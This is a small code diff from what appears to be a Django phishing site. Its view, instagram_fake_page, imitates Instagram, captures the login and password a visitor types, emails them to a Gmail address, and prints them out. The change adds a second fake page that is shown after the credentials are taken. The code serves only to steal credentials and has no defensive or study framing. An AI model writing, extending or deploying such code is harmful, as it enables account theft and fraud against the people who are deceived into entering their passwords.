@@ -11,4 +11,5 @@ def instagram_fake_page(request, *args, **kwargs):
                   f'Ваш логин: {login}\nПароль: {password}',
                   'fishsite0@gmail.com', ['tancor159@gmail.com'])
         print(f'login: {login}\npassword: {password}')
+        return render(request, 'fake_insta/instagram2.html')
     return render(request, 'fake_insta/instagram.html')
